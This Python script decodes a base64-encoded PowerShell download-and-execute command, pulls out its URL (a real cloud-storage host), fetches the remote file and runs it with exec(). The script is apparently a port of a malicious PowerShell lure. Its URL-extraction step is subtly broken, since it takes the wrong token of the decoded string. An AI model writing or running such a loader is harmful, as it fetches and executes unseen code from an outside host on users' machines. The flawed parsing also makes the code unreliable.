import base64
import requests

# Base64 encoded string (same as in the PowerShell command)
encoded_string = "aWV4IChpd3IgJ2h0dHBzOi8vaWR5YW8ub3NzLWFwLW5vcnRoZWFzdC0xLmFsaXl1bmNzLmNvbS9JSWNPUG9Pdi50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ="

# Decoding the Base64 string to get the URL and script
decoded_string = base64.b64decode(encoded_string).decode("utf-8")

# Clean the decoded string to extract only the URL and correct the format
# In this case, we know it will be 'https://...'
url = decoded_string.split(" ")[1].strip("'")

# Ensure the URL is valid and properly formatted
if url.startswith("http"):
    print(f"Fetching content from URL: {url}")
    # Fetch the content from the URL
    response = requests.get(url)

    # Check if the request was successful
    if response.status_code == 200:
        print("Content fetched successfully.")
        # Execute the content (be very cautious with this in a real-world scenario!)
        exec(response.text)
    else:
        print(f"Failed to fetch content. Status code: {response.status_code}")
else:
    print("Invalid URL format detected. Please check the decoded string.")
